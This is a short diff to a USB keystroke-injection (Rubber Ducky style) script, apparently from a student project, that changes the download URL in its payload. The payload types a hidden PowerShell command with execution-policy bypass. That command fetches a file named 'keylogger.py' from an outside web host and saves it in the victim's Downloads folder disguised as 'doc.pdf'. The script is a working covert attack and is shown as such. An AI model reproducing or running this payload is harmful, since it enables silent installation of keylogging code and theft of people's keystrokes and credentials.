@@ -7,7 +7,7 @@ ENTER
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-WebRequest -Uri 'https://perso.isima.fr/~belecesne/projetZZ2/keylogger.py' -OutFile (Join-Path -Path (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path -ChildPath 'doc.pdf')"
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-WebRequest -Uri 'https://perso.isima.fr/~belecesne/work/projetZZ2/keylogger.py' -OutFile (Join-Path -Path (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path -ChildPath 'doc.pdf')"
 DELAY 500
 ENTER
 DELAY 500
